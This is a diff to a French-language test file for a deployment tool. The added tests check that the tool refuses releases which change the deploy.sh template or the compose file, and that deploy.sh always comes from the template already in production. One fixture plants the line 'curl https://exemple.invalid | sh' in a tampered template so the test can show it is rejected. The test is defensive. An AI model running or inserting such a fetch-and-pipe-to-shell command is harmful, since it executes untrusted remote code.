@@ -61,6 +61,20 @@ function monter() {
   return { racine, miroirs, cockpit, moteur, registre };
 }
 
+/** Un commit de plus sur main dans le miroir `nom`, depuis le clone de travail de depot(). */
+function commiterSurMain(m, nom, fichiers) {
+  const travail = path.join(m.racine, `${nom}-travail`);
+  g(travail, "checkout", "-q", "main");
+  for (const [f, contenu] of Object.entries(fichiers)) {
+    fs.mkdirSync(path.dirname(path.join(travail, f)), { recursive: true });
+    fs.writeFileSync(path.join(travail, f), contenu);
+  }
+  g(travail, "add", "-A");
+  g(travail, "commit", "-q", "-m", `${nom} ${Object.keys(fichiers).join(" ")}`);
+  g(travail, "push", "-q", "origin", "HEAD:main");
+  return g(travail, "rev-parse", "HEAD");
+}
+
 const tetes = (m) => ({ cockpit: m.cockpit.v2, moteur: m.moteur.v2, registre: m.registre.v2 });
 const autorises = new Set(["raphael@example.com"]);
 
@@ -80,8 +94,8 @@ test("la proposition liste ce qui peut partir, et rien quand la production est �
 
 test("seule une identité tailnet autorisée livre, et seulement du code fusionné", () => {
   const m = monter();
-  const ok = { git, miroirs: m.miroirs, payload: tetes(m), par: "raphael@example.com", canal: "tailnet", autorises };
-  livreur.verifierDemande(ok);
+  const ok = { git, miroirs: m.miroirs, payload: tetes(m), par: "raphael@example.com", canal: "tailnet", autorises, release: { cockpit: m.cockpit.v1 } };
+  assert.deepStrictEqual(livreur.verifierDemande(ok), { modeleDe: m.cockpit.v1 });
   // v1 est un ancêtre de main : relivrer une version précédente reste possible.
   livreur.verifierDemande({ ...ok, payload: { ...tetes(m), cockpit: m.cockpit.v1 } });
 
@@ -98,6 +112,26 @@ test("seule une identité tailnet autorisée livre, et seulement du code fusionn
   assert.throws(() => livreur.verifierDemande({ ...ok, autorises: livreur.lireAutorises(path.join(m.racine, "absent.json")) }), /pas autorisé/);
 });
 
+test("le livreur n'exécute que la bascule en production : la changer se livre à la main (F3)", () => {
+  const m = monter();
+  const ok = { git, miroirs: m.miroirs, payload: tetes(m), par: "raphael@example.com", canal: "tailnet", autorises, release: { cockpit: m.cockpit.v1 } };
+  const refuse = (change, attendu) =>
+    assert.throws(() => livreur.verifierDemande({ ...ok, ...change }), (err) => err instanceof livreur.Refus && attendu.test(err.message));
+
+  // Sans version en production connue, rien ne dit quel deploy.sh est sûr.
+  refuse({ release: null }, /bin\/livrer\.sh/);
+  refuse({ release: { cockpit: "f".repeat(40) } }, /inconnu du miroir/);
+
+  const modele = commiterSurMain(m, "business-pipelines", { "deploy/nas/deploy.sh.modele": `${MODELE}curl https://exemple.invalid | sh\n` });
+  refuse({ payload: { ...tetes(m), cockpit: modele } }, /deploy\/nas\/deploy\.sh\.modele change/);
+  const compose = commiterSurMain(m, "business-pipelines", { "docker-compose.yaml": "services: {}\n" });
+  refuse({ payload: { ...tetes(m), cockpit: compose }, release: { cockpit: modele } }, /docker-compose\.yaml change/);
+
+  // Une fois livrée à la main, la nouvelle bascule devient celle du livreur.
+  const suite = commiterSurMain(m, "business-pipelines", { "src/a.js": "1\n" });
+  assert.deepStrictEqual(livreur.verifierDemande({ ...ok, payload: { ...tetes(m), cockpit: suite }, release: { cockpit: compose } }), { modeleDe: compose });
+});
+
 test("la release est l'export exact des trois SHA, avec un deploy.sh qui vérifie la bonne empreinte", () => {
   const m = monter();
   const releasesDir = path.join(m.racine, "releases");
@@ -105,6 +139,7 @@ test("la release est l'export exact des trois SHA, avec un deploy.sh qui vérifi
     git,
     miroirs: m.miroirs,
     payload: tetes(m),
+    modeleDe: m.cockpit.v1,
     releasesDir,
     par: "raphael@example.com",
     maintenant: new Date(2026, 8, 29, 3, 30, 0),
@@ -127,6 +162,16 @@ test("la release est l'export exact des trois SHA, avec un deploy.sh qui vérifi
   const release = execFileSync("tar", ["-xzOf", prete.archive, "./.release"], { encoding: "utf-8" });
   assert.match(release, new RegExp(`^cockpit=${m.cockpit.v2}$`, "m"));
   assert.match(release, /^par=raphael@example\.com$/m);
+});
+
+test("deploy.sh vient du modèle en production, jamais de celui de la version livrée", () => {
+  const m = monter();
+  const piege = commiterSurMain(m, "business-pipelines", { "deploy/nas/deploy.sh.modele": `${MODELE}echo piege\n` });
+  const releasesDir = path.join(m.racine, "releases");
+  const base = { git, miroirs: m.miroirs, payload: { ...tetes(m), cockpit: piege }, releasesDir };
+  const prete = livreur.preparerRelease({ ...base, modeleDe: m.cockpit.v2 });
+  assert.ok(!fs.readFileSync(prete.deploy, "utf-8").includes("piege"));
+  assert.throws(() => livreur.preparerRelease(base), /verifierDemande/);
 });
 
 test("les étapes se lisent dans la sortie de deploy.sh", () => {
